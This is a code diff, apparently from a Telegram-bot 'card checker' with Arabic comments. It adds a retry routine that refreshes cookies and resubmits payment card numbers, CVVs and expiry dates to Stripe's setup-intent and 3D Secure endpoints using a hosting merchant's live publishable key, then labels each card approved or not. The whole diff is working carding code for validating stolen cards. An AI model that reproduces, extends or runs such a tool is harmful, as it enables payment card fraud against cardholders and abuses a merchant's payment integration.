@@ -293,12 +293,76 @@ async def check_card(card, bot_app):
                 session.close()
                 return card, "AUTH_ATTEMPTED", "Auth Attempted"
             else:
+                # Unknown Status - تجديد الكوكيز ومحاولة مرة أخرى
+                print(f"[!] Unknown Status: {trans_status}، محاولة تجديد الكوكيز...")
+                session.close()
+                
+                if refresh_cookies_if_needed():
+                    print("[✓] تم تجديد الكوكيز، إعادة المحاولة...")
+                    # محاولة واحدة فقط بعد التجديد
+                    retry_session, retry_muid, retry_sid, retry_guid, retry_stripe_js_id = create_fresh_session()
+                    retry_csrf, retry_setup = get_payment_page(retry_session)
+                    
+                    if retry_setup:
+                        # إعادة نفس الخطوات
+                        retry_confirm_data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=+&payment_method_data[billing_details][address][city]=&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=&payment_method_data[billing_details][address][state]=AL&payment_method_data[card][number]={card_number}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[guid]={retry_guid}&payment_method_data[muid]={retry_muid}&payment_method_data[sid]={retry_sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F0366a8cf46%3B+stripe-js-v3%2F0366a8cf46%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fmy.knownhost.com&payment_method_data[time_on_page]={time_on_page}&payment_method_data[client_attribution_metadata][client_session_id]={retry_stripe_js_id}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn&client_attribution_metadata[client_session_id]={retry_stripe_js_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_secret={retry_setup}'
+                        
+                        retry_intent_id = retry_setup.split('_secret_')[0]
+                        
+                        try:
+                            retry_response = retry_session.post(
+                                f'https://api.stripe.com/v1/setup_intents/{retry_intent_id}/confirm',
+                                headers=headers,
+                                data=retry_confirm_data,
+                                timeout=30
+                            )
+                            
+                            retry_result = retry_response.json()
+                            
+                            if 'next_action' in retry_result:
+                                retry_source = retry_result['next_action']['use_stripe_sdk']['three_d_secure_2_source']
+                                retry_auth_data = f'source={retry_source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F141.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn'
+                                
+                                retry_auth_response = retry_session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=retry_auth_data, timeout=30)
+                                retry_auth_result = retry_auth_response.json()
+                                retry_trans_status = retry_auth_result.get('ares', {}).get('transStatus', 'Unknown')
+                                
+                                # فحص النتيجة بعد التجديد
+                                if retry_trans_status == 'N':
+                                    stats['approved'] += 1
+                                    stats['checking'] -= 1
+                                    stats['last_response'] = 'N - Approved ✅ (Retry)'
+                                    await update_dashboard(bot_app)
+                                    await send_result(bot_app, card, "APPROVED", "Approved ✅")
+                                    retry_session.close()
+                                    return card, "APPROVED", "Approved"
+                                elif retry_trans_status == 'C':
+                                    stats['secure_3d'] += 1
+                                    stats['checking'] -= 1
+                                    stats['last_response'] = 'C - 3D Secure ⚠️ (Retry)'
+                                    await update_dashboard(bot_app)
+                                    await send_result(bot_app, card, "3D_SECURE", "3D Secure Challenge")
+                                    retry_session.close()
+                                    return card, "3D_SECURE", "3DS"
+                                elif retry_trans_status == 'A':
+                                    stats['auth_attempted'] += 1
+                                    stats['checking'] -= 1
+                                    stats['last_response'] = 'A - Auth Attempted 🔄 (Retry)'
+                                    await update_dashboard(bot_app)
+                                    await send_result(bot_app, card, "AUTH_ATTEMPTED", "Authentication Attempted")
+                                    retry_session.close()
+                                    return card, "AUTH_ATTEMPTED", "Auth Attempted"
+                        except:
+                            pass
+                        
+                        retry_session.close()
+                
+                # إذا فشل التجديد أو المحاولة الثانية
                 stats['errors'] += 1
                 stats['error_details']['UNKNOWN_STATUS'] = stats['error_details'].get('UNKNOWN_STATUS', 0) + 1
                 stats['checking'] -= 1
                 stats['last_response'] = f'Status: {trans_status}'
                 await update_dashboard(bot_app)
-                session.close()
                 return card, "UNKNOWN", trans_status
         else:
             stats['errors'] += 1
